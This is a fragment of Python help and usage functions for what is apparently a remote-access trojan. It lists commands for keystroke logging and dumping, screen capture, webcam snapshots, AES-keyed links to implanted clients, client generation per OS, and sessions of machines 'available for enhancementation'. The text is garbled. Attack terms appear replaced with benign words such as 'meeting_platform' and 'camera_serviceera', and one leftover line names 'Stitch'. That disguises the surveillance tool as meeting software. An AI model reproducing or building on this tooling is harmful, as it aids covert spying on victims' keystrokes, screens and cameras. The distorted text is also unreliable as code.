...
from meeting_platform_utils import st_print
...
def usage_input_service(): st_print('[*] Usage: input_service [status/start/stop/dump]\n')
...
def usage_screen_capture(): st_print('[*] Usage: screen_capture\n')
...
def usage_meeting_platformgen(): st_print('[*] Usage: meeting_platform_gen\n')
...
def usage_camera_servicesnap(): st_print('[*] Usage: camera_servicesnap [device]\n')

def usage_camera_servicelist(): st_print('[*] Usage: camera_servicelist\n')
...
def st_help_addkey():
    st_print("[*] Adds an AES key to the library; allowing communication with "\
             "Stitch client_apps which use that encryption key.")
    usage_addkey()
...
def st_help_connect():
    st_print('[*] Attempts to connect to a server running a meeting_platform client_app.')
    usage_connect()
...
def st_help_screen_capture():
    st_print('[*] Takes a screen_capture of the screen.')
    usage_screen_capture()

def st_help_sessions():
    st_print('[*] Displays machines available for enhancementation.')
    usage_sessions()
...
def st_help_showkey():
    st_print('[*] Displays the active encrypted AES key used for client_app creation.')
    usage_showkey()
...
def st_help_meeting_platformgen():
    st_print('[*] Generates meeting_platform client_apps based on running OS.')
    usage_meeting_platformgen()
...
def st_help_camera_servicesnap():
    st_print('[*] Takes and downloads a picture using a connected camera_serviceera.')
    usage_camera_servicesnap()

def st_help_camera_servicelist():
    st_print('[*] Displays list of connected camera_serviceeras.')
    usage_camera_servicelist()
